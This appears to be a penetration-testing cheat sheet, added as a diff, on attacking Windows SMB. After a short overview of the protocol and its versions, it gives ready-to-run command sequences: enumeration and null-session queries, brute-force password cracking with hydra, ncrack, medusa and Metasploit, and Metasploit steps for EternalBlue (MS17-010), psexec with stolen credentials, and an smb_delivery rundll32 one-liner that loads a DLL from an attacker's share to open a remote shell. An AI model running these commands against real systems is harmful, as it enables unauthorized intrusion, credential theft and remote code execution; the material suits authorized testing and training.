@@ -1,0 +1,181 @@
+The Server Message Block(SMB) protocol's security track record has been poor for over a decade, due to its complex implecation, and open nature. From unauthenticated 
+SMB null session in Windows 2000 and XP, to a plethora of SMB bugs and vulnerabilities over the year, SMB has seen its fair share of action. Server Message Block (SMB), 
+the modern dialect of which was known as Common Internet File System, operates as an application-layer network protocol for file sharing that allows applications on a 
+computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or 
+other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows 
+applications to read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request.
+
+-----------------
+ Working of SMB
+-----------------
+
+SMB functions as a request-response or client-server protocol. The only time that the protocol does not work in a response-request framework is when a client requests 
+an opportunistic lock (oplock) and the server has to break an existing oplock because the current mode is incompatible with the existing oplock. Client computers 
+using SMB connect to a supporting server using NetBIOS over TCP/IP, IPX/SPX, or NetBUI. Once the connection is established, the client computer or program can then 
+open, read/write, and access files similar to the file system on a local computer.
+---------------------------
+  Versions of Windows SMB
+--------------------------- 
+	1.CIFS: The old version of SMB, which was included in Microsoft Windows NT 4.0 in 1996.
+	2.SMB 1.0 / SMB1: The version used in Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2.
+  3.SMB 2.0 / SMB2: This version used in Windows Vista and Windows Server 2008.
+	4.SMB 2.1 / SMB2.1: This version used in Windows 7 and Windows Server 2008 R2.
+	5.SMB 3.0 / SMB3: This version used in Windows 8 and Windows Server 2012.
+	6.SMB 3.02 / SMB3: This version used in Windows 8.1 and Windows Server 2012 R2.
+ 	7.SMB 3.1: This version used in Windows Server 2016 and Windows 10.
+
+Presently, the latest version of SMB is the SMB 3.1.1 which was introduced with Windows 10 and Windows Server 2016. This version supports AES 128 GCM encryption in 
+addition to AES 128 CCM encryption added in SMB3, and implements pre-authentication integrity check using SHA-512 hash. SMB 3.1.1 also makes secure negotiation 
+mandatory when connecting to clients using SMB 2.x and higher.
+
+-----------------
+ SMB Enumeration
+-----------------
+To identify the following information of Windows or Samba system, every pentester go for SMB enumeration during network penetration testing.
+
+	1.Banner Grabbing
+	2.RID cycling
+	3.User listing
+	4.Listing of group membership information
+	5.Share enumeration
+	6.Detecting if a host is in a workgroup or a domain
+	7.Identifying the remote operating system
+	8.Password policy retrieval
+
+-----------------------------------
+ Scanning for the NetBIOS Service
+-----------------------------------
+The SMB NetBIOS service listen on TCP port 139 and 445, as well as several UDP ports. 
+
+1. nmap
+	#nmap -v -p 139,445 -oG smb.txt IPADDRESS
+	#nmap --script smb* -p 139,445 IPADDRESS
+  Scripts List 
+	  /usr/share/nmap/scripts/smb2-capabilities.nse
+	  /usr/share/nmap/scripts/smb2-security-mode.nse
+	  /usr/share/nmap/scripts/smb2-time.nse
+	  /usr/share/nmap/scripts/smb2-vuln-uptime.nse
+	  /usr/share/nmap/scripts/smb-brute.nse
+	  /usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
+	  /usr/share/nmap/scripts/smb-enum-domains.nse
+    /usr/share/nmap/scripts/smb-enum-groups.nse
+	  /usr/share/nmap/scripts/smb-enum-processes.nse
+	  /usr/share/nmap/scripts/smb-enum-services.nse
+	  /usr/share/nmap/scripts/smb-enum-sessions.nse
+	  /usr/share/nmap/scripts/smb-enum-shares.nse
+	  /usr/share/nmap/scripts/smb-enum-users.nse
+	  /usr/share/nmap/scripts/smb-flood.nse
+	  /usr/share/nmap/scripts/smb-ls.nse
+	  /usr/share/nmap/scripts/smb-mbenum.nse
+	  /usr/share/nmap/scripts/smb-os-discovery.nse
+	  /usr/share/nmap/scripts/smb-print-text.nse
+	  /usr/share/nmap/scripts/smb-protocols.nse
+	  /usr/share/nmap/scripts/smb-psexec.nse
+	  /usr/share/nmap/scripts/smb-security-mode.nse
+	  /usr/share/nmap/scripts/smb-server-stats.nse
+	  /usr/share/nmap/scripts/smb-system-info.nse
+	  /usr/share/nmap/scripts/smb-vuln-conficker.nse
+	  /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
+	  /usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
+	  /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
+	  /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
+	  /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
+	  /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
+	  /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
+	  /usr/share/nmap/scripts/smb-vuln-ms17-010.nse
+	  /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
+	  /usr/share/nmap/scripts/smb-vuln-webexec.nse
+	  /usr/share/nmap/scripts/smb-webexec-exploit.nse
+
+2. nbtscan 
+	#nbtscan -r IPADDRESS
+
+3. nmblookup
+	#nmblookup -A IPADDRESS 
+	
+	For unique names:
+	    00: Workstation Service (workstation name)
+	    03: Windows Messenger service
+	    06: Remote Access Service
+	    20: File Service (also called Host Record)
+	    21: Remote Access Service client
+      1B: Domain Master Browser – Primary Domain Controller for a domain
+	    1D: Master Browser
+	For group names:
+	    00: Workstation Service (workgroup/domain name)
+	    1C: Domain Controllers for a domain
+	    1E: Browser Service Elections
+
+4. SMBMap
+	#smbmap -H IPADDRESS
+	#smbmap -H IPADDRESS -d DOMAIN -u USERNAME -p PASSWORD
+
+5. smbclient 
+	#smbclient -L IPADDRESS
+	#smbclient  //IPADDRESS/SHARE 
+
+6. enum4linux 
+  #enum4linux -a IPADDRESS
+  
+	Key Features
+	1.RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)
+	2.User listing (When RestrictAnonymous is set to 0 on Windows 2000)
+	3.Listing of group membership information
+	4.Share enumeration
+	5.Detecting if the host is in a workgroup or a domain
+	6.Identifying the remote operating system
+	7.Password policy retrieval
+  
+7.rpcclient 
+We can use rpcclient to open an authenticated SMB session to a target machine by creating a null session , as we have entered a usename of ""
+	#rpcclient -U "" -N IPADDRESS
+	>enumdomusers
+	>queryuser RID
+  
+---------------------
+ Password Cracking
+---------------------
+
+1. Hydra
+  #hydra -L user.txt -P pass.txt IPADDRESS smb
+  
+2. Ncrack
+  #ncrack –U /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt IPADDRESS –p 445,139
+
+3. Medusa
+  #medusa -h IPADDRESS -U /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt -M smbnt
+  
+4. Metasploit
+  #msfconsole
+  >msf exploit (smb_login)>set rhosts IPADDRESS
+  >msf exploit (smb_login)>set user_file /root/Desktop/user.txt
+  >msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
+  >msf exploit (smb_login)>set stop_on_success true
+  >msf exploit (smb_login)>exploit
+  
+
+-------------------------------
+ Multiple Ways to Exploit SMB
+-------------------------------
+After getting username and password of target machine then with the help of the following module of Metasploit you can obtain meterpreter session to access the 
+remote shell.
+
+1. Eternal Blue
+It is vulnerable to MS17-010 and we can use Metasploit to exploit this machine. 
+  #msfconsole
+  >use exploit/windows/smb/ms17_010_eternalblue
+  >msf exploit(ms17_010_eternalblue) > set rhost IPADDRESS
+  >msf exploit(ms17_010_eternalblue) > exploit
+
+2. PSexec – To Connect SMB
+  >use exploit/windows/smb/psexec
+  >msf exploit windows/smb/psexec) > set rhost IP
+  >msf exploit(windows/smb/psexec) > set smbuser USER
+  >msf exploit(windows/smb/psexec) > set smbpass PASS
+  >msf exploit(windows/smb/psexec) > exploit
+ 
+3. Rundll32 One-liner to Exploit SMB
+  >use exploit/windows/smb/smb_delivery
+  >msf exploit(windows/smb/smb_delivery) > set srvhost IPADDRESS
+  >msf exploit(windows/smb/smb_delivery) > exploit
+  >msf exploit(windows/smb/smb_delivery) > rundll32.exe \\IPADDRESS\test.dll.0
